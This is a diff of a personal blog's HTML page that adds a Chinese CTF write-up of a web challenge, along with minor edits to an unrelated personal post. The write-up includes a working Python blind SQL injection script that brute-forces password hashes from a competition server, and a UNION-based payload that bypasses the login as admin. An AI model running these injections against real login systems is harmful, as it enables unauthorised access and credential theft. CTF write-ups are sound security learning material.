@@ -168,6 +168,96 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/14/2024-09-14-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%A4%8D%E8%B5%9B%E8%B5%9B%E5%90%8E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QST137">
+      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QST2's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/09/14/2024-09-14-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%A4%8D%E8%B5%9B%E8%B5%9B%E5%90%8E/" class="post-title-link" itemprop="url">长城杯复赛赛后</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-09-14 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-14T00:00:00+08:00">2024-09-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-09-15 00:39:09" itemprop="dateModified" datetime="2024-09-15T00:39:09+08:00">2024-09-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="长城杯复赛"><a href="#长城杯复赛" class="headerlink" title="长城杯复赛"></a>长城杯复赛</h1><p>线下赛没有线上紧张，第一是自己的事情，第二不用抢题做，大概我还在愚昧之峰；</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="GreatSQL"><a href="#GreatSQL" class="headerlink" title="GreatSQL"></a>GreatSQL</h3><p>说是 sqlmap 可以梭？倒显得我不会用 sqlmap 了；</p>
+<p>一个登录框，登录成功即可获得 flag ；</p>
+<p>会提示用户是否存在，随便试了几个，admin 不存在，user 存在；</p>
+<p>盲注爆一下 user 的密码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://39.106.48.123:39446/login&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    right_password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> password_i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&#x27;1234567890qwertyuiopasdfghjklzxcvbnm&#x27;</span>:</span><br><span class="line">            ascii_i = <span class="built_in">ord</span>(char)</span><br><span class="line">            data = &#123;<span class="string">&quot;username&quot;</span>:<span class="string">f&quot;user\&#x27;and ascii(substr(password,<span class="subst">&#123;password_i&#125;</span>,1))=<span class="subst">&#123;ascii_i&#125;</span>;#&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;qst&quot;</span>&#125;</span><br><span class="line">            resp = requests.post(url=url,data = data)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(resp.text) == <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">print</span>(ascii_i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                right_password = right_password+<span class="built_in">chr</span>(ascii_i)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;now:<span class="subst">&#123;right_password&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(password_i)</span><br><span class="line"><span class="comment"># now:e10adc3949ba59abbe56e057f20f883e</span></span><br></pre></td></tr></table></figure>
+
+<p>爆 md5，密码是 <code>md5(&#39;123456&#39;)</code>；</p>
+<p>登录提示要 login as admin，类似盲注爆一下用户名，爆出 test，pika 两个，分别爆密码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test</span></span><br><span class="line"><span class="comment"># now:098f6bcd4621d373cade4e832627b4f6</span></span><br><span class="line"><span class="comment"># md5(&#x27;test&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pika</span></span><br><span class="line"><span class="comment"># now:81ccafb8ef19e583f737f569c51d3cde</span></span><br><span class="line"><span class="comment"># not a weak md5</span></span><br></pre></td></tr></table></figure>
+
+<p>登了没用，没有 admin；</p>
+<p>sql 执行出错会报不存在，测一下后台 <code>select</code> 的列数，username 为<code>user&#39; union select 1,2,3,4</code> 显示密码错误而非不存在，说明结果有四列；</p>
+<p>最终 payload：<code>urlencode(&#39;username=usr&#39; union select 1,2,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,&#39;admin&#39;;#&amp;password=123456)</code>；</p>
+<h2 id="Todo-List"><a href="#Todo-List" class="headerlink" title="Todo List"></a>Todo List</h2><p>需要看一些 Java，我总感觉 OpenGauss 连网条件下应该很简单；</p>
+<p>还需要学学如何配网；</p>
+<p>然后把 sqlmap 用明白。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/10/2024-09-10-%E5%A3%B9%E4%B8%AA%E6%A2%A6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -193,7 +283,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2024-09-10 00:00:00 / Modified: 02:46:31" itemprop="dateCreated datePublished" datetime="2024-09-10T00:00:00+08:00">2024-09-10</time>
+              <time title="Created: 2024-09-10 00:00:00 / Modified: 18:53:42" itemprop="dateCreated datePublished" datetime="2024-09-10T00:00:00+08:00">2024-09-10</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -230,7 +320,7 @@
 <p><img src="https://i.imgur.com/44MS2pW.png"></p>
 <h2 id="全没睡"><a href="#全没睡" class="headerlink" title="全没睡"></a>全没睡</h2><p>搞笑了；</p>
 <p><img src="https://i.imgur.com/8XqESuO.png"></p>
-<h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>我总感觉梦到那些他她死去，是一件很龌龊的事情，难道你觉得此生对他人的奉献已经足够？你已经做得足够好？</p>
+<h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>我总感觉梦到那些他她死去，是一件很龌龊的事情，难道你觉得对他人此生的奉献已经足够？你已经做得足够好？</p>
 <p>差得远了，小秦，醒醒！</p>
 
       
@@ -282,7 +372,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-09-10 02:25:41" itemprop="dateModified" datetime="2024-09-10T02:25:41+08:00">2024-09-10</time>
+                <time title="Modified: 2024-09-10 18:56:05" itemprop="dateModified" datetime="2024-09-10T18:56:05+08:00">2024-09-10</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -290,7 +380,7 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                 </span>
             </span>
 
@@ -1325,7 +1415,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1338,7 +1428,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">13</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
